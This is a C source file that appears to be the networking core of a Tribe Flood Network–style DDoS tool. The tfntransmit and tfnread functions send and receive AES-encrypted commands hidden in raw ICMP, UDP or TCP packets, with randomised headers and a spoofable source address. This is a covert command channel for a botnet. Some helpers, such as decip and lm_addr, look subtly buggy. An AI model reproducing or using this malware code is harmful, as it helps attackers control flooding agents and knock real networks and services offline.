#include <mix/net.h>
#include <mix/mix.h>

int
isip(char *ip)
{
  int a, b, c, d;

  if (!sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d))
    return 0;
  if (a < 1)
    return 0;
  if (a > 255)
    return 0;
  if (b < 0)
    return 0;
  if (b > 255)
    return 0;
  if (c < 0)
    return 0;
  if (c > 255)
    return 0;
  if (d < 0)
    return 0;
  if (d > 255)
    return 0;
  return 1;
}

unsigned long
resolve(char *host)
{
  struct hostent *he;
  struct sa tmp;

  if (isip(host))
    return (inet_addr(host));
  he = gethostbyname(host);
  if (he)
    {
      memcpy(&tmp.add, he->h_addr, he->h_length);
    }
  else
    return (0);
  return (tmp.add);
}

char *
lm_ntoa(unsigned int addr, char *dest)
{
 unsigned char *c = (unsigned char *)&addr;
 snprintf(dest,18,"%u.%u.%u.%u", c[0], c[1], c[2], c[3]);
 return dest;
}

unsigned int
lm_addr(char *dest)
{
 unsigned int retval = 0;
 unsigned char *c = (unsigned char *)&retval;
 sscanf(dest,"%c.%c.%c.%c", &c[0], &c[1], &c[2], &c[3]);
 return retval;
}

/* ntoa() is now depreceated */

char *
ntoa(unsigned int in)
{
  struct in_addr ad;

  ad.s_addr = in;
  return (inet_ntoa(ad));
}

/* I am RFC1071 compliant... :P */

unsigned short
sum(unsigned short *buf, int nwords)
{
  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

/* I am RFC793 compliant... */

void 
tcpsum(char *ippacket, struct lmip *ih, struct lmtcp *tch, int tot_len)
{
  char *pbuf = NEW(char, bufsize - 52);
  struct pseudo
    {
      long src, dst;
      u8 mbz, pro, len;
    };
  struct pseudo *ph = (struct pseudo *) pbuf;

  memset(pbuf, 0, bufsize - 52);
  ph->src = ih->src;
  ph->dst = ih->dst;
  ph->mbz = 0;
  ph->pro = P_TCP;
  ph->len = htons(tot_len - M_IP);
  tch->sum = 0;
  memcpy(pbuf + 12, ippacket + M_IP, tot_len - M_IP);
  tch->sum = sum((u16 *) pbuf, ((tot_len - M_IP) + 12) >> 1);
  DELETE(pbuf);
}

int
incip(char *ip)
{
  int a, b, c, d;

  sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);

  if (a >= 255)
    return 0;
  if (b >= 255)
    {
      b = 0;
      a++;
    }
  if (c >= 255)
    {
      c = 0;
      b++;
    }
  if (d >= 255)
    {
      d = 0;
      c++;
    }
  else d++;

  sprintf(ip, "%d.%d.%d.%d", a, b, c, d);

  return 1;
}

int
decip(char *ip)
{
  int a, b, c, d;

  sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d);

  if (a <= 0)
    return 0;
  if (b <= 0)
    {
      b = 255;
      a++;
    }
  if (c <= 0)
    {
      c = 255;
      b++;
    }
  if (d <= 0)
    {
      d = 255;
      c++;
    }

  d--;

  sprintf(ip, "%d.%d.%d.%d", a, b, c, d);

  return 1;
}

int
rawsock(int protocol)
{
  int one = 1, fd = socket(PF_INET, SOCK_RAW, protocol);
  const int *val = &one;

  if (fd < 0)
    return -1;
  else if (setsockopt(fd, P_IP, MY_HDRINCL, val, sizeof(one)) < 0)
    {
      close(fd);
      return -1;
    }
  return fd;
}

int
psock(void)
{
#ifdef SOCK_PACKET
  return socket(PF_INET, SOCK_PACKET, htons(ETHALL));
#else
  /* D'oh */
  return rawsock(P_RAW);
#endif
}

void
tfntransmit(unsigned long from, unsigned long to, int proto, char *payload)
{
  char *buf = NEW(char, bufsize), *data, *p, *ctmp;
  struct lmip *ih = (struct lmip *) buf;
  struct lmicmp *ich = (struct lmicmp *) (buf + sizeof(struct lmip));
  struct lmudp *udh = (struct lmudp *) (buf + sizeof(struct lmip));
  struct lmtcp *tch = (struct lmtcp *) (buf + sizeof(struct lmip));
  struct sa sin;
  int tot_len = sizeof(struct lmip), ssock, i;

  data = NEW(char, bufsize);

  memset(buf, 0, bufsize);
  memset(data, 0, bufsize);

  data[0] = (char) getrandom(33, 126);
  data[1] = data[0] + 1;
  data[2] = data[0];
  strncpy(data + 3, payload, bufsize - 3);
  i = strlen(data);

  sin.fam = PF_INET;
  sin.add = to;

  ih->ver = 4;
  ih->ihl = 5;
  ih->tos = 0x00;
  ih->tl = 0;
  ih->id = htons(getrandom(1024, 65535));
  ih->off = 0;
  ih->ttl = getrandom(200, 255);
  ih->sum = 0;
  ih->src = from;
  ih->dst = to;

  switch ((proto < 0) ? getrandom(0, 2) : proto)
    {
    case 0:
      tot_len += sizeof(struct lmicmp);

      ih->pro = P_ICMP;
      ssock = rawsock(P_ICMP);
      p = buf + sizeof(struct lmip) + sizeof(struct lmicmp);

      ich->type = 0;
      ich->code = 0;
      ich->id = getrandom(0, 1) ? getrandom(0, 65535) : 0;
      ich->seq = getrandom(0, 1) ? getrandom(0, 65535) : 0;
      ich->sum = 0;
      ctmp = (char *) aes_encrypt((const u1byte *) data, &i);
      if (aes_binary)
	memcpy(p, ctmp, i);
      else
	strncpy(p, ctmp, bufsize - 128);
      DELETE(ctmp);

      tot_len += aes_binary ? i : strlen(p);
      ich->sum = sum((u16 *) ich, (tot_len - M_IP) >> 1);
      ih->tl = tot_len;
      sin.dp = htons(0);
      break;
    case 1:
      tot_len += sizeof(struct lmudp);

      ih->pro = P_UDP;
      ssock = rawsock(P_UDP);
      p = buf + sizeof(struct lmip) + sizeof(struct lmudp);

      udh->src = htons(getrandom(0, 65535));
      udh->dst = htons(getrandom(0, 65535));
      udh->sum = 0;
      ctmp = (char *) aes_encrypt((const u1byte *) data, &i);
      if (aes_binary)
	memcpy(p, ctmp, i);
      else
	strncpy(p, ctmp, bufsize - 128);
      DELETE(ctmp);

      tot_len += aes_binary ? i : strlen(p);
      udh->len = htons(sizeof(struct lmudp) + 3 + aes_binary ? i : strlen(p));

      udh->sum = sum((u16 *) udh, (tot_len - M_IP) >> 1);

      ih->tl = tot_len;
      sin.dp = htons(udh->dst);
      break;
    case 2:
      tot_len += sizeof(struct lmtcp);

      ih->pro = P_TCP;
      ssock = rawsock(P_TCP);
      p = buf + sizeof(struct lmip) + sizeof(struct lmtcp);

      tch->src = htons(getrandom(0, 65535));
      tch->dst = htons(getrandom(0, 65535));
      tch->seq = getrandom(0, 1) ? htonl(getrandom(0, 65535) + (getrandom(0, 65535) << 8)) : 0;
      tch->ack = getrandom(0, 1) ? htonl(getrandom(0, 65535) + (getrandom(0, 65535) << 8)) : 0;
      tch->off = 0;
      tch->flg = getrandom(0, 1) ? (getrandom(0, 1) ? SYN : ACK) : SYN | ACK;
      tch->win = getrandom(0, 1) ? htons(getrandom(0, 65535)) : 0;
      tch->urp = 0;
      tch->sum = 0;
      ctmp = (char *) aes_encrypt((const u1byte *) data, &i);
      if (aes_binary)
	memcpy(p, ctmp, i);
      else
	strncpy(p, ctmp, bufsize - 128);
      DELETE(ctmp);

      tot_len += aes_binary ? i : strlen(p);
      ih->tl = tot_len;
      tcpsum(buf, ih, tch, tot_len);
      sin.dp = htons(tch->dst);
      break;
    default:
      return;
      break;
    }

  if (sendto(ssock, buf, tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    perror("sendto");

  DELETE(buf);
  DELETE(data);

  close(ssock);
}

char *
tfnread(int rawisock, int rawusock, int rawtsock)
{
struct timeval tv = {0,0};
return tfnread2(rawisock, rawusock, rawtsock, tv);
}

char *
tfnread2(int rawisock, int rawusock, int rawtsock, struct timeval tv)
{
  char *buf, *clear, *data, *p = NULL;
  struct tribe *tribeh;
  int i = 0;
  fd_set rfds;

  buf = NEW(char, bufsize);

  FD_ZERO(&rfds);
  FD_SET(rawisock, &rfds);
  FD_SET(rawusock, &rfds);
  FD_SET(rawtsock, &rfds);

  if ((rawisock > rawusock) && (rawisock > rawtsock))
    i = rawisock + 1;
  else if ((rawtsock > rawusock) && (rawtsock > rawisock))
    i = rawtsock + 1;
  else if ((rawusock > rawisock) && (rawusock > rawtsock))
    i = rawusock + 1;

  if (select(i, &rfds, NULL, NULL, ((!tv.tv_sec) && (!tv.tv_usec))?NULL:&tv) < 1)
    {
      DELETE(buf);
      return NULL;
    }

  memset(buf, 0, bufsize);

  if (FD_ISSET(rawisock, &rfds))
    {
      i = read(rawisock, buf,
	       bufsize) - (sizeof(struct lmip) + sizeof(struct lmicmp));

      if (i < 4)
	goto nomatch;
      p = (buf + sizeof(struct lmip) + sizeof(struct lmicmp));

      if (aes_binary && !isprint(p[0]))
	goto nomatch;
      clear = (char *) aes_decrypt((const u1byte *) p, i);
      tribeh = (struct tribe *) clear;
      if ((tribeh->start == tribeh->end) && (tribeh->id == tribeh->start + 1))
	{
	  data = NEW(char, strlen(clear));
	  strcpy(data, clear + sizeof(struct tribe));

	  DELETE(clear);
	  DELETE(buf);
	  return data;
	}
      DELETE(clear);
    }
  memset(buf, 0, bufsize);

  if (FD_ISSET(rawtsock, &rfds))
    {
      i =
	read(rawtsock, buf,
	     bufsize) - (sizeof(struct lmip) + sizeof(struct lmtcp));

      if (i < 4)
	goto nomatch;
      p = (buf + sizeof(struct lmip) + sizeof(struct lmtcp));

      if (aes_binary && !isprint(p[0]))
	goto nomatch;
      clear = (char *) aes_decrypt((const u1byte *) p, i);
      tribeh = (struct tribe *) clear;
      if ((tribeh->start == tribeh->end) && (tribeh->id == tribeh->start + 1))
	{
	  data = NEW(char, strlen(clear));
	  strcpy(data, clear + sizeof(struct tribe));

	  DELETE(clear);
	  DELETE(buf);

	  return data;
	}
      DELETE(clear);
    }
  memset(buf, 0, bufsize);

  if (FD_ISSET(rawusock, &rfds))
    {
      i = read(rawusock, buf,
	       bufsize) - (sizeof(struct lmip) + sizeof(struct lmudp));

      if (i < 4)
	goto nomatch;
      p = (buf + sizeof(struct lmip) + sizeof(struct lmudp));

      if (aes_binary && !isprint(p[0]))
	goto nomatch;
      clear = (char *) aes_decrypt((const u1byte *) p, i);
      tribeh = (struct tribe *) clear;
      if ((tribeh->start == tribeh->end) && (tribeh->id == tribeh->start + 1))
	{
	  data = NEW(char, strlen(clear));
	  strcpy(data, clear + sizeof(struct tribe));

	  DELETE(clear);
	  DELETE(buf);

	  return data;
	}
      DELETE(clear);
    }

nomatch:
  DELETE(buf);
  return NULL;
}

unsigned int inet_gethostaddr (void)
{
char hn[128];
unsigned int res = 0;
gethostname (hn, 128);
res = resolve(hn);
return res;
}

unsigned int
inet_local(void)
{
  int fd;
  int one = 1, myport = getrandom(0, 65535), pid = 0, i = 0;
  unsigned int myhost = getrandom(0, 65535) + (getrandom(0, 65535) << 8);
  char packet[8192];
  struct sa s;
  struct lmip *ih = (struct lmip *) (packet + M_ETH);
  struct lmtcp *th = (struct lmtcp *) (packet + M_ETH + M_IP);

  signal (SIGCHLD, SIG_IGN);
  if (!(pid = fork()))
    {
      signal (SIGCHLD, SIG_IGN);
      setpgid(0, getpgid(0)+1);
      sleep (1);
      fd = socket(AF_INET, SOCK_STREAM, 0);
      s.fam = AF_INET;
      s.dp = htons(myport);
      s.add = myhost;
      usleep(500000);
      alarm(30);
      (void) connect(fd, (struct sockaddr *) &s, M_SIN);
      close(fd);
      sleep(1);
      exit(0);
      raise(9);
    }

  fd = psock();
  for (i = 0; i < 1024; i++)
    {
      memset(packet, 0, 8192);
      if ((one = read(fd, packet, 8192)) > 0)
	{
	  if ((myhost == ih->dst) && (myport == ntohs(th->dst)))
	    {
	      kill(pid, 9);
	      return ih->src;
	    }
	}
    }

  kill(pid, 9);
  return 0;
}

void
ethdst(struct eth *eh, char *addr)
{
  (void) sscanf(addr, "%02x:%02x:%02x:%02x:%02x:%02x",
	      (int *) &eh->dst[0], (int *) &eh->dst[1], (int *) &eh->dst[2],
	     (int *) &eh->dst[3], (int *) &eh->dst[4], (int *) &eh->dst[5]);
}

void
ethsrc(struct eth *eh, char *addr)
{
  (void) sscanf(addr, "%02x:%02x:%02x:%02x:%02x:%02x",
	      (int *) &eh->src[0], (int *) &eh->src[1], (int *) &eh->src[2],
	     (int *) &eh->src[3], (int *) &eh->src[4], (int *) &eh->src[5]);
}
